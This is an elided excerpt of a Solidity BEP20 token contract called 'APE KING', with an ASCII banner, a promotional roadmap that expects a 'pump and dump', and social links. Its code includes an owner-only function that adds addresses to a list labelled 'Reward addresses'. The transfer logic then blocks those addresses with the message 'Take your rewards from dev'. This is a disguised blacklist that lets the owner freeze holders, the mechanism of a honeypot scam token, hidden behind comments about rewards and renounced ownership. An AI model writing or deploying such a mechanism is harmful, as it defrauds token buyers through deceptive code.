...
/**
         ...
         .8.          8 888888888o   8 8888888888   8 8888     ,88'  8 8888 b.             8     ,o888888o.    
        .888.         8 8888    `88. 8 8888         8 8888    ,88'   8 8888 888o.          8    8888     `88.  
       :88888.        8 8888     `88 8 8888         8 8888   ,88'    8 8888 Y88888o.       8 ,8 8888       `8. 
      . `88888.       8 8888     ,88 8 8888         8 8888  ,88'     8 8888 .`Y888888o.    8 88 8888           
     .8. `88888.      8 8888.   ,88' 8 888888888888 8 8888 ,88'      8 8888 8o. `Y888888o. 8 88 8888           
    .8`8. `88888.     8 888888888P'  8 8888         8 8888 88'       8 8888 8`Y8o. `Y88888o8 88 8888           
   .8' `8. `88888.    8 8888         8 8888         8 888888<        8 8888 8   `Y8o. `Y8888 88 8888   8888888 
  .8'   `8. `88888.   8 8888         8 8888         8 8888 `Y8.      8 8888 8      `Y8o. `Y8 `8 8888       .8' 
 .888888888. `88888.  8 8888         8 8888         8 8888   `Y8.    8 8888 8         `Y8o.`    8888     ,88'  
.8'       `8. `88888. 8 8888         8 888888888888 8 8888     `Y8.  8 8888 8            `Yo     `8888888P'    


* ROADMAP *
    
    We have many plans for this token moving forwards, but at launch none of these are ready. 
    We know that this token will initially pump and dump... they all do! But after that, it should settle down 
    and then slowly begin to climb. 
    
    We are working with other developers to create some premium member services for the website. These will only 
    be available to people that hold over a specific amount of this token. 
    We will post more details about this at the website when we are ready. 
    
    There is 7% total tax...
    
    3% is redistributed to holders
    4% is added to the liquidity
	
	Liquidity will be burnt forever
	Ownership will be renounced after launch

    Web:        http://www.apeking.space
    Telegram :  t.me/apekingOFC
    Twitter:    https://twitter.com/apekingOFC
...
contract APEKING is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "APE KING";
    string private constant _symbol   = "APEKING/CHESTBEATER";
...
subtractedValue) public virtual returns (bool) {
    ...
    //adding multiple addresses to the rewards
...
onlyOwner {
	...
	//Reward addreses
        require(!_isReward[from] && !_isReward[to], "Take your rewards from dev");
...
amount, bool takeFee) private {
		...
		require(!_isReward[sender] && !_isReward[recipient], "To/from");
        if (!takeFee) {
            removeAllFee();
        }
